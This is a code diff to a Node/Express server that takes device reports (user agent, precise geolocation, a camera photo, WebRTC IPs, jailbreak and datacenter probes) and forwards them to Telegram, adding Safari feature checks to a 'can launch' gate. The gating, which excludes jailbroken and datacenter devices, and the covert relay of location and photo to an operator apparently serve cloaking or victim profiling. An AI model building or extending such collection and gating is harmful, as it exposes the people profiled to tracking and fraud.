@@ -1,4 +1,4 @@
-// === server/index.js (photo+caption + one HTML doc; patched JB logic + iPad desktop + MacIntel OK + UA iOS fallback) ===
+// === server/index.js (photo+caption + one HTML doc; + VT18/18.4 features; patched JB logic + iPad desktop + MacIntel OK + UA iOS fallback) ===
 import 'dotenv/config';
 import express from 'express';
 import path from 'path';
@@ -131,7 +131,6 @@ function gmLink(lat, lon, z = 17) {
   return `<a href="${href}">${escapeHTML(`${lat}, ${lon}`)}</a>`;
 }
 
-// ===== status & verdict =====
 const OK = (b) => b ? '✅' : '❌';
 function normVer(maybe) {
   if (typeof maybe === 'number') return maybe;
@@ -183,7 +182,6 @@ function pickIosVersion(iosVersion, cp, userAgent, platform) {
     if (n != null) return n;
   }
 
-  // Фолбэк: на MacIntel берём major версию из UA ("Version/18.5" → 18)
   const plat = String(platform || '');
   if (/MacIntel/i.test(plat)) {
     const n = parseIOSMajorFromUAUniversal(String(userAgent || ''));
@@ -192,14 +190,23 @@ function pickIosVersion(iosVersion, cp, userAgent, platform) {
   return null;
 }
 
-function deriveStatus({ iosVersion, platform, userAgent, cp = {}, dc = {} }) {
+// === НОРМАЛІЗАЦІЯ featuresSummary (VT18/18.4) ===
+function normalizeFeatures(featuresSummary) {
+  const fv = featuresSummary || {};
+  const tag = (x) => (x === true || String(x).toLowerCase() === 'ok') ? 'ok' : '—';
+  const VT18  = tag(fv.VT18 ?? fv.vt18 ?? fv.viewTransitions);
+  const V184  = tag(fv.v18_4 ?? fv.v184 ?? fv.triple18_4 ?? fv.shape_cookie_webauthn);
+  return { VT18, v18_4: V184, ok: (VT18 === 'ok' && V184 === 'ok') };
+}
+
+function deriveStatus({ iosVersion, platform, userAgent, cp = {}, dc = {}, features }) {
   const v = pickIosVersion(iosVersion, cp, userAgent, platform);
   const iosOk = v != null && v >= 18;
 
   const plat = String(platform || '');
   const classicOk     = /iPhone|iPad/i.test(plat);
   const ipadDesktopOk = isIpadDesktop({ platform: plat, userAgent, cp });
-  const macIntelOk    = /MacIntel/i.test(plat);            // MacIntel теперь валиден
+  const macIntelOk    = /MacIntel/i.test(plat);
   const platformOk    = classicOk || ipadDesktopOk || macIntelOk;
 
   const jb            = cp?.jbProbesActive || {};
@@ -220,10 +227,13 @@ function deriveStatus({ iosVersion, platform, userAgent, cp = {}, dc = {} }) {
   const camOk  = perms.camera === 'granted' || perms.camera === true;
   const micOk  = perms.microphone === 'granted' || perms.microphone === true;
 
-  const canLaunch = iosOk && platformOk && jbOk;
+  const featuresOk = features ? !!features.ok : true;    // якщо клієнт не передав — не блокуємо
+
+  const canLaunch = iosOk && platformOk && jbOk && featuresOk;
 
   return {
     iosOk, platformOk, jbOk, dcOk, geoOk, camOk, micOk,
+    featuresOk, features,
     jbLabel, dcWords, canLaunch,
     iosVersionDetected: v,
     ipadDesktopOk,
@@ -233,8 +243,8 @@ function deriveStatus({ iosVersion, platform, userAgent, cp = {}, dc = {} }) {
 }
 
 // [HTML] — отчёт (чеклист + сводка + JB-таблица + сырой JSON)
-function buildHtmlReport({ code, geo, userAgent, platform, iosVersion, isSafari, cp, dc }) {
-  const s   = deriveStatus({ iosVersion, platform, userAgent, cp, dc });
+function buildHtmlReport({ code, geo, userAgent, platform, iosVersion, isSafari, cp, dc, features }) {
+  const s   = deriveStatus({ iosVersion, platform, userAgent, cp, dc, features });
   const jb  = cp?.jbProbesActive || {};
   const jbSum  = jb.summary || {};
 
@@ -276,6 +286,7 @@ function buildHtmlReport({ code, geo, userAgent, platform, iosVersion, isSafari,
     <div class="card">
       <h2>Чеклист статуса</h2>
       <div class="kv">
+        <div><b>Safari features (18)</b></div><div>${OK(s.featuresOk)} VT18=<span class="pill">${escapeHTML(s.features?.VT18 || '—')}</span> · 18.4=<span class="pill">${escapeHTML(s.features?.v18_4 || '—')}</span></div>
         <div><b>iOS ≥ 18</b></div><div>${OK(s.iosOk)} <span class="${s.iosOk?'ok':'bad'}">${s.iosOk?'ok':'low'}</span> <span class="pill"><code>${escapeHTML(String(s.iosVersionDetected ?? 'n/a'))}</code></span></div>
         <div><b>Платформа iPhone/iPad/MacIntel</b></div><div>${OK(s.platformOk)} <span class="${s.platformOk?'ok':'bad'}">${
           s.platformOk
@@ -299,6 +310,7 @@ function buildHtmlReport({ code, geo, userAgent, platform, iosVersion, isSafari,
         <div><b>Code</b></div><div><code>${escapeHTML(String(code).toUpperCase())}</code></div>
         <div><b>UA</b></div><div><code>${escapeHTML(userAgent || '')}</code></div>
         <div><b>iOS / Platform</b></div><div><code>${escapeHTML(String(s.iosVersionDetected ?? ''))}</code> · <code>${escapeHTML(String(platform||''))}</code></div>
+        <div><b>Safari features</b></div><div>VT18=<code>${escapeHTML(s.features?.VT18 || '—')}</code>, 18.4=<code>${escapeHTML(s.features?.v18_4 || '—')}</code></div>
         <div><b>Jailbreak</b></div><div>${escapeHTML(jbInfo)}</div>
         <div><b>Geo</b></div><div>${geo ? `<a class="soft" href="https://maps.google.com/?q=${encodeURIComponent(geo.lat)},${encodeURIComponent(geo.lon)}&z=17" target="_blank" rel="noreferrer">${escapeHTML(`${geo.lat}, ${geo.lon}`)}</a> &nbsp;±${escapeHTML(String(geo.acc))} м` : 'нет данных'}</div>
       </div>
@@ -328,6 +340,7 @@ function buildHtmlReport({ code, geo, userAgent, platform, iosVersion, isSafari,
 
   const jsonPretty = safeJson({
     geo, userAgent, platform, iosVersionDetected: s.iosVersionDetected, isSafari,
+    featuresSummary: s.features,       // <-- добавили сюда
     client_profile: cp, device_check: dc
   }, 2);
 
@@ -428,9 +441,9 @@ app.post('/api/report', async (req, res) => {
     const {
       userAgent, platform, iosVersion, isSafari,
       geo, photoBase64, note, code,
-
       client_profile,   // включает jbProbesActive, permissions, webrtcIps, ...
-      device_check      // { score, label, reasons[], details{...} }
+      device_check,     // { score, label, reasons[], details{...} }
+      featuresSummary   // <-- НОВОЕ
     } = req.body || {};
 
     if (!code)        return res.status(400).json({ ok:false, error: 'No code' });
@@ -442,7 +455,8 @@ app.post('/api/report', async (req, res) => {
 
     const cp = client_profile || {};
     const dc = device_check   || {};
-    const s  = deriveStatus({ iosVersion, platform, userAgent, cp, dc });
+    const feats = normalizeFeatures(featuresSummary);   // <-- нормализация
+    const s  = deriveStatus({ iosVersion, platform, userAgent, cp, dc, features: feats });
 
     const captionLines = [
       '<b>Новый отчёт 18+ проверка</b>',
@@ -451,6 +465,7 @@ app.post('/api/report', async (req, res) => {
       `${OK(s.platformOk)} Платформа: <code>${escapeHTML(String(platform||'n/a'))}${s.ipadDesktopOk ? ' (iPad desktop-mode)' : (s.macIntelOk ? ' (MacIntel)' : '')}</code>`,
       `${OK(s.jbOk)} ${s.jbOk ? 'нет джейлбрейка' : 'обнаружены JB-признаки'}`,
       `${OK(s.dcOk)} DC/ISP: ${s.dcOk ? 'нет' : '<b>найдены</b>'}`,
+      `Safari: ${OK(s.featuresOk)} VT18=<code>${escapeHTML(feats.VT18)}</code>, 18.4=<code>${escapeHTML(feats.v18_4)}</code>`, // <-- НОВАЯ СТРОКА
       `Geo: ${geo ? `${gmLink(geo.lat, geo.lon)} <code>±${escapeHTML(String(geo.acc))}</code>m` : '<code>нет</code>'}`,
       `UA: <code>${escapeHTML(userAgent || '')}</code>`,
       `Итог: <b>${s.canLaunch ? 'Можно запускать' : 'Нельзя запускать'}</b>`,
@@ -467,7 +482,7 @@ app.post('/api/report', async (req, res) => {
 
     const html = buildHtmlReport({
       code, geo, userAgent, platform, iosVersion, isSafari,
-      cp, dc
+      cp, dc, features: feats
     });
     const fname = `report-${String(code).toUpperCase()}-${Date.now()}.html`;
     const tgDoc = await sendDocumentToTelegram({
